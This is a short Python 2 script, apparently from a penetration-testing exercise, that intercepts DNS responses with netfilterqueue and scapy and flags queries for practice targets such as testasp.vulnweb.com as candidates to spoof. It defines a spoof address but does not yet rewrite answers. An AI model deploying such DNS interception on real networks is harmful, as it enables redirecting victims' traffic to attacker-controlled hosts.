#!/usr/bin/env python2
# Rebuild
import netfilterqueue
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNSQR

target_ip = "192.168.63.174"
target_interface = "Ethernet0"
spoor_ip = "192.168.63.139"
# 44.238.29.244
# rrname = 'pentest-standard.org'
# rdata = 96.126.116.56

target_dns = [
    "www.pentest-standard.org",
    "juice-shop.herokuapp.com",
    "testasp.vulnweb.com"
]

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        for target_dn in target_dns:
            if target_dn in qname:
                print("\n[+] we have a Target DN Server to Spoof: ")
                print(qname + "\n")
        # packet.drop()
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()